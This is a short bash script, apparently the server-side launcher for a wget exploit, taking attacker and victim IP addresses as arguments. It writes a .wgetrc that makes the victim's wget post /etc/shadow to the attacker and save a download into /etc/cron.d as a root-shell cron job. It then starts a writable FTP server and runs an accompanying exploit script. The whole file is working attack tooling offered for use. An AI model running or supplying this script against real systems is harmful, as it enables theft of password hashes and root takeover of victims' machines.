#!/bin/bash

#This scrip is to run on the server side of the wget exploit.
#We assume one knows the server's IP address (IP_address_server), and the client to be exploited (IP_address_client)

#usage: ./wgettest_server.sh <IP_address_server> <IP_address_client>

sudo cat <<_EOF_>.wgetrc
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
_EOF_

sudo pip install pyftpdlib

sudo python -m pyftpdlib -p21 -w &

sleep 2s

sudo python ./wget-exploit.py $1 $2
